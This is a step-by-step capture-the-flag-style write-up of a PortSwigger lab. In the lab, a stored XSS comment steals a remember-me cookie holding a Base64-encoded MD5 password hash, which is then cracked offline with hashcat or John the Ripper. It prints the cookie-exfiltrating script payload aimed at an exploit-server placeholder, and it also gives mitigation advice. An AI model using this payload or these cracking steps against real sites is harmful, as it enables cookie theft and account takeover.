# 📘 PortSwigger Lab: Offline Password Cracking

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking  
> 📚 PortSwigger Theory: https://portswigger.net/web-security/authentication/other-mechanisms  
> 🎯 Topic: Authentication vulnerabilities — vulnerabilities in other authentication mechanisms  
> 🧪 Difficulty: Practitioner

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🔐 Correct Stay-Logged-In Design](#correct-flow)
- [❌ Vulnerable Application Logic](#vulnerable-flow)
- [🍪 Understanding the `stay-logged-in` Cookie](#cookie)
- [🔤 Why Base64 Does Not Protect Data](#base64)
- [#️⃣ Why MD5 Is Dangerous for Passwords](#md5)
- [⚡ Online vs Offline Password Cracking](#offline)
- [💉 Using Stored XSS to Steal the Cookie](#xss)
- [🔍 Step 1 — Inspect Your Own Cookie](#step1)
- [🔍 Step 2 — Confirm the Cookie Format](#step2)
- [🔍 Step 3 — Prepare the Exploit Server](#step3)
- [🔍 Step 4 — Store the XSS Payload](#step4)
- [🔍 Step 5 — Obtain Carlos's Cookie](#step5)
- [🔍 Step 6 — Decode the Cookie](#step6)
- [🔍 Step 7 — Recover the Password](#step7)
- [🔍 Step 8 — Log In as Carlos](#step8)
- [🔍 Step 9 — Delete the Account](#step9)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Obtain the persistent login cookie belonging to `carlos`, extract the password hash, recover the password offline, authenticate as the victim, and delete his account.

Available information:

```text
Your account:
wiener:peter

Victim username:
carlos
```

Required attack sequence:

```text
1. Investigate the Stay logged in feature
2. Determine the persistent cookie format
3. Steal Carlos's cookie using Stored XSS
4. Decode the cookie
5. Extract the MD5 password hash
6. Recover the plaintext password
7. Log in as Carlos
8. Delete his account
```

---

<a id="theory"></a>

## 🧠 Short Theory

A normal session and a persistent login mechanism solve different problems.

```text
Session cookie
        ↓
Maintains the current authenticated session
        ↓
Usually expires after logout or a defined timeout
```

```text
Remember-me cookie
        ↓
Restores authentication at a later time
        ↓
May remain valid for days, weeks, or months
```

Persistent authentication tokens therefore require strong protection.

In this lab, the problem is especially severe:

```text
The cookie is not a random token.
It contains the username and the MD5 hash of the password.
```

---

<a id="idea"></a>

## 🧩 Core Idea

The application constructs the cookie as:

```text
Base64(username + ":" + MD5(password))
```

For `wiener`:

```text
Username:
wiener

Password:
peter
```

MD5:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

Value before Base64:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Cookie value:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

After Carlos's cookie is stolen and decoded:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

The password represented by this known hash is:

```text
onceuponatime
```

---

<a id="correct-flow"></a>

## 🔐 Correct Stay-Logged-In Design

A secure implementation should use a cryptographically random opaque token.

```text
User enables Stay logged in
        ↓
Server generates a random token
        ↓
Only the random token is sent to the browser
        ↓
Server stores token hash and user ID
        ↓
Server validates the token on a later visit
        ↓
Token is rotated after use
```

Example:

```http
Set-Cookie: remember_token=V1mFt3jS9...;
Secure;
HttpOnly;
SameSite=Lax;
Max-Age=2592000
```

Server-side record:

```text
token_hash
user_id
created_at
expires_at
last_used_at
revoked
```

Critical principle:

```text
Neither the password nor its hash
should ever be sent to the client.
```

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Application Logic

The application behaves approximately as follows:

```text
User submits username and password
        ↓
Application calculates MD5(password)
        ↓
Application builds username:md5(password)
        ↓
The string is Base64-encoded
        ↓
The result becomes the stay-logged-in cookie
```

Example:

```text
wiener
+
:
+
MD5(peter)
        ↓
wiener:51dc30ddc473d43a6011e9ebba6ca770
        ↓
Base64
        ↓
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Security failures:

```text
1. Base64 is fully reversible
2. MD5 is extremely fast
3. Password-derived material is sent to the browser
4. The cookie is accessible to JavaScript
5. Comments are vulnerable to Stored XSS
6. Carlos uses a password from a known wordlist
```

---

<a id="cookie"></a>

## 🍪 Understanding the `stay-logged-in` Cookie

After logging in with:

```text
Stay logged in
```

enabled, requests contain:

```http
Cookie: session=SESSION_VALUE;
stay-logged-in=BASE64_VALUE
```

Example:

```http
GET /my-account?id=wiener HTTP/2
Host: vulnerable-website.com
Cookie: session=SESSION_VALUE; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Base64-decoded value:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

The delimiter is:

```text
:
```

Left side:

```text
username
```

Right side:

```text
MD5(password)
```

---

<a id="base64"></a>

## 🔤 Why Base64 Does Not Protect Data

Base64 is encoding, not encryption.

```text
Plaintext
        ↓
Base64 encode
        ↓
Encoded text
        ↓
Base64 decode
        ↓
Original plaintext
```

Decoding requires no:

```text
Secret key
Password
Certificate
Server access
```

Linux example:

```bash
echo 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw' | base64 -d
```

Result:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Burp Suite:

```text
Decoder
        ↓
Paste value
        ↓
Decode as
        ↓
Base64
```

Main lesson:

```text
Base64 changes representation,
but provides no confidentiality.
```

---

<a id="md5"></a>

## #️⃣ Why MD5 Is Dangerous for Passwords

MD5 outputs a 128-bit hash, commonly represented as 32 hexadecimal characters.

Example:

```bash
echo -n 'peter' | md5sum
```

Result:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

MD5 is unsuitable for password storage because:

```text
1. It is extremely fast
2. It does not automatically use a salt
3. It is highly optimized on GPUs
4. Precomputed databases exist
5. The same password always produces the same MD5
6. Dictionary attacks are extremely efficient
```

Password hashing should use:

```text
Argon2id
bcrypt
scrypt
PBKDF2
```

These algorithms intentionally make each guess expensive.

---

<a id="offline"></a>

## ⚡ Online vs Offline Password Cracking

### Online attack

Each guess is submitted to the application:

```text
attacker
        ↓
POST /login
        ↓
server
        ↓
valid / invalid
```

The server may enforce:

```text
Rate limiting
Account lockout
CAPTCHA
Delays
MFA
IP monitoring
Alerting
```

### Offline attack

The attacker already has the hash:

```text
26323c16d5f4dabff3bb136f2460a943
```

All testing occurs locally:

```text
candidate password
        ↓
MD5(candidate)
        ↓
compare with stolen hash
```

The application does not see these attempts.

Attacker advantages:

```text
No account lockout
No CAPTCHA
No network delay
GPU acceleration
Large wordlists
```

Hashcat:

```bash
hashcat -m 0 hash.txt passwords.txt
```

Where:

```text
-m 0 = raw MD5
```

Display the result:

```bash
hashcat -m 0 hash.txt passwords.txt --show
```

John the Ripper:

```bash
john --format=raw-md5 --wordlist=passwords.txt hash.txt
```

---

<a id="xss"></a>

## 💉 Using Stored XSS to Steal the Cookie

Stored XSS occurs when an application:

```text
1. Accepts attacker-controlled input
2. Stores the input
3. Renders it without safe output encoding
4. Executes JavaScript in another user's browser
```

The vulnerable input in this lab is the blog comment functionality.

Payload:

```html
<script>
document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
```

When Carlos opens the page:

```text
Carlos loads the blog post
        ↓
The browser renders the stored comment
        ↓
The <script> element executes
        ↓
document.cookie reads accessible cookies
        ↓
The browser sends a request to the Exploit Server
        ↓
The cookie appears in the access log
```

This is possible because the sensitive cookie is not protected by:

```text
HttpOnly
```

---

<a id="step1"></a>

## 🔍 Step 1 — Inspect Your Own Cookie

Open the lab through Burp Suite.

Log in using:

```text
Username: wiener
Password: peter
```

Enable:

```text
Stay logged in
```

Open:

```text
Proxy → HTTP history
```

Locate a request to:

```text
/my-account
```

or the response to:

```text
POST /login
```

Find:

```http
stay-logged-in=...
```

Example:

```http
GET /my-account?id=wiener HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VALUE; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

---

<a id="step2"></a>

## 🔍 Step 2 — Confirm the Cookie Format

Copy:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Open:

```text
Decoder
```

Select:

```text
Decode as → Base64
```

Result:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Verify the known password:

```bash
echo -n 'peter' | md5sum
```

Result:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

The format is confirmed:

```text
Base64(username:MD5(password))
```

This confirms the hypothesis using an attacker-controlled account before targeting the victim.

---

<a id="step3"></a>

## 🔍 Step 3 — Prepare the Exploit Server

Open:

```text
Go to exploit server
```

Copy the server URL:

```text
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

This server will receive the request generated by Carlos's browser.

Open:

```text
Access log
```

The stolen cookie will later appear here.

---

<a id="step4"></a>

## 🔍 Step 4 — Store the XSS Payload

Open any blog post.

Submit the following comment:

```html
<script>
document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
```

Use ordinary values for the remaining fields:

```text
Name: test
Email: test@test.com
Website: https://example.com
```

Submit the comment.

The payload is stored by the application and executes when another user views the page.

---

<a id="step5"></a>

## 🔍 Step 5 — Obtain Carlos's Cookie

Return to the Exploit Server.

Open:

```text
Access log
```

Locate the victim's request.

Example:

```http
GET /secret=...;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

The relevant value is:

```text
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

This is Carlos's Base64-encoded persistent cookie.

---

<a id="step6"></a>

## 🔍 Step 6 — Decode the Cookie

If required, first use:

```text
Decode as → URL
```

Then use:

```text
Decode as → Base64
```

Result:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

Split the value:

```text
Username:
carlos

MD5 hash:
26323c16d5f4dabff3bb136f2460a943
```

The attacker now has offline cracking material.

---

<a id="step7"></a>

## 🔍 Step 7 — Recover the Password

Save the hash:

```bash
echo '26323c16d5f4dabff3bb136f2460a943' > hash.txt
```

### Hashcat

```bash
hashcat -m 0 hash.txt passwords.txt
```

Display the recovered password:

```bash
hashcat -m 0 hash.txt passwords.txt --show
```

### John the Ripper

```bash
john --format=raw-md5 --wordlist=passwords.txt hash.txt
```

Display the result:

```bash
john --show --format=raw-md5 hash.txt
```

For the lab hash:

```text
26323c16d5f4dabff3bb136f2460a943:onceuponatime
```

Therefore:

```text
Password: onceuponatime
```

> [!WARNING]
> During a real penetration test, never submit client password hashes to a public lookup service without explicit authorization. Doing so may expose sensitive client data.

---

<a id="step8"></a>

## 🔍 Step 8 — Log In as Carlos

Log out of Wiener's account.

Open:

```text
/login
```

Enter:

```text
Username: carlos
Password: onceuponatime
```

A successful login opens:

```text
/my-account?id=carlos
```

---

<a id="step9"></a>

## 🔍 Step 9 — Delete the Account

On the account page, click:

```text
Delete account
```

Confirm the action.

The lab is solved.

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
        ↓
2. Enable Stay logged in
        ↓
3. Locate the stay-logged-in cookie
        ↓
4. Base64-decode it
        ↓
5. Identify username:MD5(password)
        ↓
6. Store an XSS payload in a comment
        ↓
7. Carlos views the infected page
        ↓
8. JavaScript reads document.cookie
        ↓
9. The browser sends the cookie to the Exploit Server
        ↓
10. Extract Carlos's cookie from the access log
        ↓
11. Base64 decode
        ↓
12. Obtain:
26323c16d5f4dabff3bb136f2460a943
        ↓
13. Recover:
onceuponatime
        ↓
14. Log in as carlos
        ↓
15. Delete the account
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The compromise requires several weaknesses.

### 1. The cookie contains password-derived material

```text
username:MD5(password)
```

A password hash must not be exposed to the client.

### 2. The application uses Base64

```text
Base64 ≠ encryption
```

Anyone can reverse the encoding.

### 3. The application uses MD5

MD5 enables very fast wordlist attacks.

### 4. JavaScript can access the cookie

Without `HttpOnly`, it is available through:

```javascript
document.cookie
```

### 5. The application contains Stored XSS

The payload is stored in a comment and runs in Carlos's browser.

### 6. The password is weak

```text
onceuponatime
```

is present in known password lists.

Complete chain:

```text
Stored XSS
+
Missing HttpOnly
+
Predictable cookie
+
Base64
+
MD5
+
Weak password
=
Account takeover
```

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When you encounter:

```text
Remember me
Stay logged in
Keep me signed in
Trust this device
```

inspect the persistent token carefully.

Questions to ask:

```text
1. Does the cookie change between logins?
2. Is it related to the username?
3. Is it Base64?
4. Is it a JWT?
5. Does it contain a user ID or email?
6. Does it contain MD5 or SHA-1?
7. Is it signed?
8. Can the username be replaced?
9. Is it revoked after logout?
10. Is it revoked after password change?
11. Does it use Secure?
12. Does it use HttpOnly?
13. Does it use SameSite?
14. Is the token rotated?
15. Does it expire?
```

When XSS is present, also test:

```text
Which cookies are visible through document.cookie?
Can requests be issued as the victim?
Can CSRF tokens be extracted?
Is CSP present?
Will an administrator view the payload?
```

Main lesson:

```text
A pentester evaluates attack chains,
not only isolated vulnerabilities.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Not enabling `Stay logged in`

The persistent cookie may not be issued.

### 2. Inspecting only the session cookie

The target is:

```text
stay-logged-in
```

### 3. Treating Base64 as encryption

Base64 is reversible without a key.

### 4. Copying extra characters

Remove:

```text
stay-logged-in=
;
spaces
other cookies
```

### 5. Skipping URL decoding

The access log may contain:

```text
%3D
%2F
%2B
%20
```

### 6. Selecting the wrong Hashcat mode

Raw MD5 uses:

```text
-m 0
```

### 7. Hashing a trailing newline

Incorrect:

```bash
echo 'peter' | md5sum
```

Correct:

```bash
echo -n 'peter' | md5sum
```

### 8. Leaving the placeholder exploit-server ID

Replace:

```text
YOUR-EXPLOIT-SERVER-ID
```

with the actual lab value.

### 9. Looking for the cookie in the exploit body

The cookie appears in:

```text
Access log
```

### 10. Logging in without deleting the account

The final required action is:

```text
Delete account
```

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Use random tokens

```python
token = secrets.token_urlsafe(32)
```

The token must have high entropy and must not be derived from the password.

### 2. Store tokens securely server-side

```text
SHA-256(token)
        ↓
user_id
expires_at
revoked
```

### 3. Never expose password hashes

Unsafe:

```text
Base64(username:MD5(password))
```

Safe:

```text
random opaque token
```

### 4. Protect cookies

```http
Set-Cookie: remember_token=...;
Secure;
HttpOnly;
SameSite=Lax;
Path=/;
Max-Age=2592000
```

### 5. Rotate tokens

After successful use:

```text
Old token → revoke
New token → issue
```

### 6. Support revocation

Revoke tokens after:

```text
Logout
Password change
Account recovery
Suspicious activity
Device removal
```

### 7. Use a modern password KDF

Preferred:

```text
Argon2id
```

Alternatives:

```text
bcrypt
scrypt
PBKDF2
```

### 8. Prevent Stored XSS

Use:

```text
Context-aware output encoding
Safe template engines
HTML sanitization
Content Security Policy
Avoiding unsafe inline scripts
```

### 9. Do not rely only on HttpOnly

`HttpOnly` protects cookie confidentiality but does not remove XSS.

XSS may still:

```text
Issue authenticated requests
Read page content
Modify the DOM
Extract tokens from HTML
Perform sensitive actions
```

---

<a id="checklist"></a>

## ✅ Checklist

- [x] Logged in as `wiener:peter`.
- [x] Enabled `Stay logged in`.
- [x] Located the `stay-logged-in` cookie.
- [x] Base64-decoded the cookie.
- [x] Identified `username:MD5(password)`.
- [x] Verified the MD5 of `peter`.
- [x] Opened the Exploit Server.
- [x] Copied the Exploit Server URL.
- [x] Prepared the Stored XSS payload.
- [x] Stored the payload in a comment.
- [x] Received Carlos's request in the access log.
- [x] Extracted the persistent cookie.
- [x] URL-decoded it where necessary.
- [x] Base64-decoded it.
- [x] Obtained `26323c16d5f4dabff3bb136f2460a943`.
- [x] Recovered `onceuponatime`.
- [x] Logged in as `carlos`.
- [x] Opened the `My account` page.
- [x] Deleted Carlos's account.
- [x] Solved the lab.

---

<a id="references"></a>



# ⬆ Back to Top

[Return to contents](#top)
